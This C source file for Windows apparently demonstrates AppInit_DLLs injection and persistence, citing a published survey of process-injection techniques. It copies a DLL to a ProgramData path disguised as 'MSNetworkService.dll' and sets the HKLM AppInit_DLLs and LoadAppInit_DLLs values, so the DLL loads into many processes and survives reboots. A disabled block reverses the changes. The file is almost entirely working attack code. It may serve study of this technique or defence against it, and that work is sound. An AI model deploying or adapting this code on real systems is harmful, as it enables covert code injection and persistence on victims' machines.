#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>

/*
** Injection And Persistence Via Registry Modification
** - https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
*/

void SetStringValueKey(HKEY hKey, LPCSTR keyName, const char *path)
{
	RegSetValueEx(hKey, keyName, 0, REG_SZ, (BYTE*)path, strlen(path));
}
void SetDWORDValueKey(HKEY hKey, LPCSTR keyName, DWORD data)
{
	RegSetValueEx(hKey, keyName, 0, REG_DWORD, (LPBYTE)&data, sizeof(DWORD));
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
#if 1 // Registry Modification
	HKEY hKey1, hKey2;
	long regOpenResult1, regOpenResult2;

	LPCTSTR lpSubKey1 = "SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
	LPCTSTR lpSubKey2 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows";

	regOpenResult1 = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey1, 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hKey1);
	regOpenResult2 = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey2, 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hKey2);

	const char path[] = "C:\\ProgramData\\Microsoft\\Network\\MSNetworkService.dll";
	CopyFile("testLibs.dll", path, true);
	DWORD data = 1;

	LPCSTR keyName1 = "Appinit_Dlls";
	SetStringValueKey(hKey1, keyName1, path);
	SetStringValueKey(hKey2, keyName1, path);

	LPCSTR keyName2 = "LoadAppInit_DLLs";
	SetDWORDValueKey(hKey1, keyName2, data);
	SetDWORDValueKey(hKey2, keyName2, data);

	RegCloseKey(hKey1);
	RegCloseKey(hKey2);

	MessageBox(NULL, "Hello!!", "Hellu!!", MB_OK);
#endif // Registry Modification

#if 0 // Registry set Default
	HKEY hKey1, hKey2;
	long regOpenResult1, regOpenResult2;

	LPCTSTR lpSubKey1 = "SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
	LPCTSTR lpSubKey2 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows";

	regOpenResult1 = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey1, 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hKey1);
	regOpenResult2 = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey2, 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hKey2);

	DeleteFile("C:\\ProgramData\\Microsoft\\Network\\MSNetworkService.dll");
	DWORD data = 0;

	LPCSTR keyName1 = "Appinit_Dlls";
	SetStringValueKey(hKey1, keyName1, "");
	SetStringValueKey(hKey2, keyName1, "");

	LPCSTR keyName2 = "LoadAppInit_DLLs";
	SetDWORDValueKey(hKey1, keyName2, data);
	SetDWORDValueKey(hKey2, keyName2, data);

	RegCloseKey(hKey1);
	RegCloseKey(hKey2);

	MessageBox(NULL, "#_Funny!!", "#_Funny!!", MB_OK);
#endif // Registry set Default

	return 0;
}